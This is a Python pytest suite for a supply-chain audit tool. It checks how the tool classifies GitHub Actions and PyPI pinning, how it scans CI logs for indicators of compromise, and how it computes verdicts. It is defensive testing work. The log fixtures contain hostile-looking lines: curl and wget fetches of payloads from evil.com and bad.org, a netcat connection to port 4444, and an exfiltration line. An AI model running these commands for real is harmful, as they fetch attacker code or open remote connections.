"""TDD tests for supply_chain_audit.analyzer — log analysis engine contracts.

Tests the core analysis logic: per-vector analysis (Actions SHA/tag,
PyPI version pinning), IOC scanning, and verdict computation.

Tests are written FIRST (TDD Red phase) and will fail until
implementation is complete.
"""

from __future__ import annotations

from datetime import UTC, datetime
from unittest.mock import MagicMock

import pytest

from amplihack.tools.supply_chain_audit.analyzer import Analyzer
from amplihack.tools.supply_chain_audit.models import (
    Advisory,
    AuditReport,
    Evidence,
    IOCMatch,
    IOCSet,
    RepoVerdict,
)

# ===========================================================================
# Fixtures
# ===========================================================================


@pytest.fixture
def trivy_advisory():
    return Advisory(
        id="GHSA-69fq-xp46-6x23",
        title="Trivy Action Compromise",
        description="Compromised GitHub Action with malicious code injection",
        attack_vector="actions",
        exposure_window_start=datetime(2025, 1, 13, 0, 0, 0, tzinfo=UTC),
        exposure_window_end=datetime(2025, 1, 14, 23, 59, 59, tzinfo=UTC),
        compromised_versions=["v0.18.0", "v0.19.0", "v0.20.0"],
        package_name="aquasecurity/trivy-action",
        safe_versions=[],
        safe_shas=["abc123known_good_sha"],
        iocs=IOCSet(domains=["tpcp-docs.github.io"]),
    )


@pytest.fixture
def litellm_advisory():
    return Advisory(
        id="PYPI-LITELLM-2025",
        title="LiteLLM Malicious PyPI Release",
        description="Malicious PyPI package versions with backdoor",
        attack_vector="pypi",
        exposure_window_start=datetime(2025, 3, 17, 0, 0, 0, tzinfo=UTC),
        exposure_window_end=datetime(2025, 3, 19, 23, 59, 59, tzinfo=UTC),
        compromised_versions=["1.82.7", "1.82.8"],
        package_name="litellm",
        safe_versions=["1.82.6", "1.82.9"],
        safe_shas=[],
        iocs=IOCSet(file_patterns=["*.pth"]),
    )


@pytest.fixture
def analyzer():
    """Analyzer with a mocked GitHub client."""
    mock_client = MagicMock()
    return Analyzer(github_client=mock_client)


# ===========================================================================
# Actions Vector Analysis
# ===========================================================================


class TestActionsAnalysis:
    """Tests for GitHub Actions supply chain analysis."""

    def test_sha_pinned_action_is_safe(self, analyzer, trivy_advisory):
        """Action pinned to SHA produces safe evidence."""
        workflow_content = "uses: aquasecurity/trivy-action@abc123known_good_sha"
        evidence = analyzer.analyze_workflow_reference(workflow_content, trivy_advisory)
        safe_signals = [e for e in evidence if e.signal == "safe"]
        assert len(safe_signals) >= 1
        assert any(e.type == "sha_pinned" for e in safe_signals)

    def test_tag_reference_is_risk(self, analyzer, trivy_advisory):
        """Action referenced by mutable tag produces risk evidence."""
        workflow_content = "uses: aquasecurity/trivy-action@v0.19.0"
        evidence = analyzer.analyze_workflow_reference(workflow_content, trivy_advisory)
        risk_signals = [e for e in evidence if e.signal == "risk"]
        assert len(risk_signals) >= 1
        assert any(e.type == "tag_reference" for e in risk_signals)

    def test_compromised_sha_is_compromised(self, analyzer, trivy_advisory):
        """Action resolving to known-bad SHA produces compromised evidence."""
        workflow_content = "uses: aquasecurity/trivy-action@known_compromised_sha_abc"
        # Simulate that the resolved SHA matches a known compromised commit
        analyzer.github_client.resolve_action_sha.return_value = "known_compromised_sha_abc"
        evidence = analyzer.analyze_workflow_reference(workflow_content, trivy_advisory)
        # With a tag ref and no safe SHA match, this should be risk or worse
        assert any(e.signal in ("risk", "compromised") for e in evidence)

    def test_no_reference_is_safe(self, analyzer, trivy_advisory):
        """Workflow that doesn't reference the package at all is safe."""
        workflow_content = "uses: actions/checkout@v4"
        evidence = analyzer.analyze_workflow_reference(workflow_content, trivy_advisory)
        safe_signals = [e for e in evidence if e.signal == "safe"]
        assert any(e.type == "no_reference" for e in safe_signals)

    def test_unknown_sha_produces_unknown_signal(self, analyzer, trivy_advisory):
        """SHA not in safe_shas produces 'unknown' signal, not 'safe'."""
        workflow_content = "uses: aquasecurity/trivy-action@deadbeef1234567"
        evidence = analyzer.analyze_workflow_reference(workflow_content, trivy_advisory)
        sha_evidence = [e for e in evidence if e.type == "sha_pinned"]
        assert len(sha_evidence) == 1
        assert sha_evidence[0].signal == "unknown"
        assert "not verified" in sha_evidence[0].detail


# ===========================================================================
# PyPI Vector Analysis
# ===========================================================================


class TestPyPIAnalysis:
    """Tests for PyPI supply chain analysis."""

    def test_safe_version_pinned(self, analyzer, litellm_advisory):
        """Lockfile pinning to safe version produces safe evidence."""
        lockfile_content = "litellm==1.82.6"
        evidence = analyzer.analyze_lockfile_reference(lockfile_content, litellm_advisory)
        safe_signals = [e for e in evidence if e.signal == "safe"]
        assert len(safe_signals) >= 1
        assert any(e.type == "version_pinned" for e in safe_signals)

    def test_compromised_version_pinned(self, analyzer, litellm_advisory):
        """Lockfile pinning to compromised version produces compromised evidence."""
        lockfile_content = "litellm==1.82.7"
        evidence = analyzer.analyze_lockfile_reference(lockfile_content, litellm_advisory)
        compromised_signals = [e for e in evidence if e.signal == "compromised"]
        assert len(compromised_signals) >= 1

    def test_unpinned_version_is_risk(self, analyzer, litellm_advisory):
        """Unpinned version (>=) produces risk evidence."""
        lockfile_content = "litellm>=1.80.0"
        evidence = analyzer.analyze_lockfile_reference(lockfile_content, litellm_advisory)
        risk_signals = [e for e in evidence if e.signal == "risk"]
        assert len(risk_signals) >= 1
        assert any(e.type == "version_unpinned" for e in risk_signals)

    def test_no_reference_is_safe(self, analyzer, litellm_advisory):
        """Lockfile that doesn't mention the package is safe."""
        lockfile_content = "requests==2.28.0\nflask==2.0.0"
        evidence = analyzer.analyze_lockfile_reference(lockfile_content, litellm_advisory)
        safe_signals = [e for e in evidence if e.signal == "safe"]
        assert any(e.type == "no_reference" for e in safe_signals)


# ===========================================================================
# Log IOC Scanning
# ===========================================================================


class TestIOCScanning:
    """Tests for IOC pattern scanning in run logs."""

    def test_domain_ioc_found(self, analyzer, trivy_advisory):
        """Domain IOC in log produces IOCMatch."""
        log_content = (
            "Step 3/10: Downloading from https://tpcp-docs.github.io/payload.sh\n"
            "Step 4/10: Executing script..."
        )
        matches = analyzer.scan_for_iocs(log_content, trivy_advisory, run_id=123)
        assert len(matches) >= 1
        assert any(m.ioc_type == "domain" for m in matches)
        assert any(m.pattern == "tpcp-docs.github.io" for m in matches)

    def test_file_pattern_ioc_found(self, analyzer, litellm_advisory):
        """File pattern IOC in log produces IOCMatch."""
        log_content = (
            "Installing collected packages: litellm\n"
            "creating /usr/lib/python3.11/site-packages/evil.pth\n"
        )
        matches = analyzer.scan_for_iocs(log_content, litellm_advisory, run_id=456)
        assert len(matches) >= 1
        assert any(m.ioc_type == "file_pattern" for m in matches)

    def test_ip_ioc_found(self, analyzer):
        """IP IOC in log produces IOCMatch."""
        advisory = Advisory(
            id="TEST-IP",
            title="Test IP",
            description="Test",
            attack_vector="actions",
            exposure_window_start=datetime(2025, 1, 1, tzinfo=UTC),
            exposure_window_end=datetime(2025, 1, 2, tzinfo=UTC),
            compromised_versions=["v1.0.0"],
            package_name="test/pkg",
            iocs=IOCSet(ips=["198.51.100.42"]),
        )
        log_content = "Connecting to 198.51.100.42:8080 for data exfiltration\n"
        matches = analyzer.scan_for_iocs(log_content, advisory, run_id=789)
        assert len(matches) >= 1
        assert any(m.ioc_type == "ip" for m in matches)

    def test_no_ioc_in_clean_log(self, analyzer, trivy_advisory):
        """Clean log produces no IOC matches."""
        log_content = "Step 1/5: Checking out code\nStep 2/5: Running tests\nAll 42 tests passed.\n"
        matches = analyzer.scan_for_iocs(log_content, trivy_advisory, run_id=100)
        assert len(matches) == 0

    def test_multiple_iocs_in_single_log(self, analyzer):
        """Multiple IOC patterns found in one log."""
        advisory = Advisory(
            id="TEST-MULTI",
            title="Multi IOC",
            description="Test",
            attack_vector="actions",
            exposure_window_start=datetime(2025, 1, 1, tzinfo=UTC),
            exposure_window_end=datetime(2025, 1, 2, tzinfo=UTC),
            compromised_versions=["v1.0.0"],
            package_name="test/pkg",
            iocs=IOCSet(
                domains=["evil.com", "bad.org"],
                ips=["10.0.0.1"],
            ),
        )
        log_content = (
            "curl https://evil.com/payload\nwget http://bad.org/script.sh\nnc 10.0.0.1 4444\n"
        )
        matches = analyzer.scan_for_iocs(log_content, advisory, run_id=999)
        assert len(matches) >= 3

    def test_ioc_match_records_line(self, analyzer, trivy_advisory):
        """IOCMatch includes the matching line content."""
        log_content = "COMPROMISED: curl https://tpcp-docs.github.io/evil.sh\n"
        matches = analyzer.scan_for_iocs(log_content, trivy_advisory, run_id=1)
        assert len(matches) >= 1
        assert "tpcp-docs.github.io" in matches[0].line

    def test_ioc_match_records_run_id(self, analyzer, trivy_advisory):
        """IOCMatch includes the workflow run ID."""
        log_content = "curl https://tpcp-docs.github.io/evil.sh\n"
        matches = analyzer.scan_for_iocs(log_content, trivy_advisory, run_id=42)
        assert matches[0].run_id == 42


# ===========================================================================
# Compromised Install Detection in Logs
# ===========================================================================


class TestCompromisedInstallDetection:
    """Tests for detecting compromised package installs in CI logs."""

    def test_pip_install_compromised_version(self, analyzer, litellm_advisory):
        """Detect pip install of compromised version in CI log."""
        log_content = (
            "Collecting litellm==1.82.7\n"
            "  Downloading litellm-1.82.7-py3-none-any.whl (4.2 MB)\n"
            "Successfully installed litellm-1.82.7\n"
        )
        evidence = analyzer.analyze_install_log(log_content, litellm_advisory, run_id=100)
        compromised = [e for e in evidence if e.signal == "compromised"]
        assert len(compromised) >= 1
        assert any(e.type == "compromised_install" for e in compromised)

    def test_pip_install_safe_version(self, analyzer, litellm_advisory):
        """Detect pip install of safe version in CI log."""
        log_content = (
            "Collecting litellm==1.82.6\n"
            "  Using cached litellm-1.82.6-py3-none-any.whl\n"
            "Successfully installed litellm-1.82.6\n"
        )
        evidence = analyzer.analyze_install_log(log_content, litellm_advisory, run_id=101)
        compromised = [e for e in evidence if e.signal == "compromised"]
        assert len(compromised) == 0

    def test_cache_used_is_safe_signal(self, analyzer, litellm_advisory):
        """Cached dependency usage produces safe evidence."""
        log_content = (
            "Using cached litellm-1.82.6-py3-none-any.whl\nSuccessfully installed litellm-1.82.6\n"
        )
        evidence = analyzer.analyze_install_log(log_content, litellm_advisory, run_id=102)
        safe = [e for e in evidence if e.signal == "safe"]
        assert any(e.type in ("cache_used", "version_pinned") for e in safe)


# ===========================================================================
# Verdict Computation
# ===========================================================================


class TestVerdictComputation:
    """Tests for three-tier verdict logic with confidence scoring."""

    def test_compromised_verdict(self, analyzer):
        """Any compromised signal produces COMPROMISED verdict."""
        evidence = [
            Evidence(type="sha_pinned", detail="pinned", signal="safe"),
            Evidence(type="ioc_match", detail="found domain", signal="compromised"),
        ]
        verdict, confidence = analyzer.compute_verdict(
            evidence,
            ioc_matches=[
                IOCMatch(
                    ioc_type="domain",
                    pattern="evil.com",
                    found_in="run_log",
                    run_id=1,
                    line="evil.com",
                )
            ],
        )
        assert verdict == "COMPROMISED"

    def test_safe_verdict(self, analyzer):
        """Only safe signals and no risk/unknown produces SAFE verdict."""
        evidence = [
            Evidence(type="sha_pinned", detail="pinned to good SHA", signal="safe"),
            Evidence(type="sha_match", detail="SHA matches known-good", signal="safe"),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert verdict == "SAFE"

    def test_inconclusive_verdict_with_risk(self, analyzer):
        """Risk signals without compromised produces INCONCLUSIVE."""
        evidence = [
            Evidence(type="tag_reference", detail="uses mutable tag", signal="risk"),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert verdict == "INCONCLUSIVE"

    def test_inconclusive_verdict_with_unknown(self, analyzer):
        """Unknown signals (no logs) produces INCONCLUSIVE."""
        evidence = [
            Evidence(type="no_logs", detail="no logs available", signal="unknown"),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert verdict == "INCONCLUSIVE"

    def test_empty_evidence_is_inconclusive(self, analyzer):
        """No evidence at all produces INCONCLUSIVE verdict."""
        verdict, confidence = analyzer.compute_verdict(evidence=[], ioc_matches=[])
        assert verdict == "INCONCLUSIVE"

    def test_high_confidence_multiple_safe_signals(self, analyzer):
        """Multiple corroborating safe signals produce HIGH confidence."""
        evidence = [
            Evidence(type="sha_pinned", detail="pinned", signal="safe"),
            Evidence(type="sha_match", detail="matches good SHA", signal="safe"),
            Evidence(type="no_reference", detail="not used", signal="safe"),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert confidence == "HIGH"

    def test_low_confidence_single_signal(self, analyzer):
        """Single signal produces LOW or MEDIUM confidence."""
        evidence = [
            Evidence(type="no_logs", detail="no logs", signal="unknown"),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert confidence in ("LOW", "MEDIUM")

    def test_compromised_overrides_safe(self, analyzer):
        """Compromised signal wins even with multiple safe signals."""
        evidence = [
            Evidence(type="sha_pinned", detail="pinned", signal="safe"),
            Evidence(type="sha_match", detail="matches", signal="safe"),
            Evidence(type="cache_used", detail="cached", signal="safe"),
            Evidence(
                type="compromised_install",
                detail="installed bad version",
                signal="compromised",
            ),
        ]
        verdict, confidence = analyzer.compute_verdict(evidence, ioc_matches=[])
        assert verdict == "COMPROMISED"


# ===========================================================================
# Full Repo Analysis
# ===========================================================================


class TestRepoAnalysis:
    """Tests for full per-repo analysis workflow."""

    def test_analyze_repo_returns_verdict(self, analyzer, trivy_advisory):
        """analyze_repo produces a RepoVerdict."""
        # Mock the github client to return empty data
        analyzer.github_client.list_workflows.return_value = []
        analyzer.github_client.get_workflow_runs.return_value = []

        verdict = analyzer.analyze_repo("owner/repo", trivy_advisory)
        assert isinstance(verdict, RepoVerdict)
        assert verdict.repo == "owner/repo"
        assert verdict.verdict in ("SAFE", "COMPROMISED", "INCONCLUSIVE")

    def test_analyze_repo_no_workflows_is_safe(self, analyzer, trivy_advisory):
        """Repo with no matching workflows is SAFE (no_reference)."""
        analyzer.github_client.list_workflows.return_value = []
        analyzer.github_client.get_workflow_runs.return_value = []
        analyzer.github_client.get_workflow_files.return_value = []

        verdict = analyzer.analyze_repo("owner/safe-repo", trivy_advisory)
        assert verdict.verdict == "SAFE"
        assert any(e.type == "no_reference" for e in verdict.evidence)

    def test_analyze_repo_counts_runs(self, analyzer, trivy_advisory):
        """analyze_repo records the number of workflow runs analyzed."""
        mock_runs = [
            {
                "id": i,
                "name": "CI",
                "path": ".github/workflows/ci.yml",
                "created_at": "2025-01-13T12:00:00Z",
                "head_sha": f"sha{i}",
                "status": "completed",
                "conclusion": "success",
            }
            for i in range(5)
        ]
        analyzer.github_client.list_workflows.return_value = [{"path": ".github/workflows/ci.yml"}]
        analyzer.github_client.get_workflow_runs.return_value = mock_runs
        analyzer.github_client.get_workflow_file_content.return_value = "uses: actions/checkout@v4"
        analyzer.github_client.get_run_logs.return_value = ""

        verdict = analyzer.analyze_repo("owner/repo", trivy_advisory)
        assert verdict.workflow_runs_analyzed >= 0


# ===========================================================================
# Full Audit (Multiple Repos)
# ===========================================================================


class TestFullAudit:
    """Tests for multi-repo audit orchestration."""

    def test_audit_returns_report(self, analyzer, trivy_advisory):
        """audit() produces an AuditReport."""
        analyzer.github_client.list_workflows.return_value = []
        analyzer.github_client.get_workflow_runs.return_value = []
        analyzer.github_client.get_workflow_files.return_value = []

        report = analyzer.audit(
            advisory=trivy_advisory,
            repos=["owner/repo1", "owner/repo2"],
        )
        assert isinstance(report, AuditReport)
        assert report.advisory_id == "GHSA-69fq-xp46-6x23"
        assert report.repos_scanned == 2
        assert len(report.verdicts) == 2

    def test_audit_summary_counts(self, analyzer, trivy_advisory):
        """Audit summary tallies verdict categories correctly."""
        analyzer.github_client.list_workflows.return_value = []
        analyzer.github_client.get_workflow_runs.return_value = []
        analyzer.github_client.get_workflow_files.return_value = []

        report = analyzer.audit(
            advisory=trivy_advisory,
            repos=["owner/repo1"],
        )
        total = (
            report.summary["safe"] + report.summary["compromised"] + report.summary["inconclusive"]
        )
        assert total == report.repos_scanned

    def test_audit_max_runs_limit(self, analyzer, trivy_advisory):
        """max_runs parameter limits workflow runs queried per repo."""
        analyzer.github_client.list_workflows.return_value = []
        analyzer.github_client.get_workflow_runs.return_value = []
        analyzer.github_client.get_workflow_files.return_value = []

        report = analyzer.audit(
            advisory=trivy_advisory,
            repos=["owner/repo1"],
            max_runs=10,
        )
        assert isinstance(report, AuditReport)


# ===========================================================================
# Edge Cases
# ===========================================================================


class TestAnalyzerEdgeCases:
    """Edge cases and error handling."""

    def test_empty_log_content(self, analyzer, trivy_advisory):
        """Empty log produces no IOC matches."""
        matches = analyzer.scan_for_iocs("", trivy_advisory, run_id=1)
        assert matches == []

    def test_none_log_content(self, analyzer, trivy_advisory):
        """None log content handled gracefully."""
        matches = analyzer.scan_for_iocs(None, trivy_advisory, run_id=1)
        assert matches == []

    def test_advisory_with_no_iocs(self, analyzer):
        """Advisory with empty IOCSet still works for analysis."""
        advisory = Advisory(
            id="TEST-NOIOC",
            title="No IOCs",
            description="Test",
            attack_vector="actions",
            exposure_window_start=datetime(2025, 1, 1, tzinfo=UTC),
            exposure_window_end=datetime(2025, 1, 2, tzinfo=UTC),
            compromised_versions=["v1.0.0"],
            package_name="test/pkg",
        )
        matches = analyzer.scan_for_iocs("some log content", advisory, run_id=1)
        assert matches == []

    def test_binary_content_in_log_handled(self, analyzer, trivy_advisory):
        """Binary/non-UTF8 content in logs doesn't crash."""
        log_content = "Normal line\n\x00\x01\x02binary junk\nAnother line\n"
        # Should not raise
        matches = analyzer.scan_for_iocs(log_content, trivy_advisory, run_id=1)
        assert isinstance(matches, list)
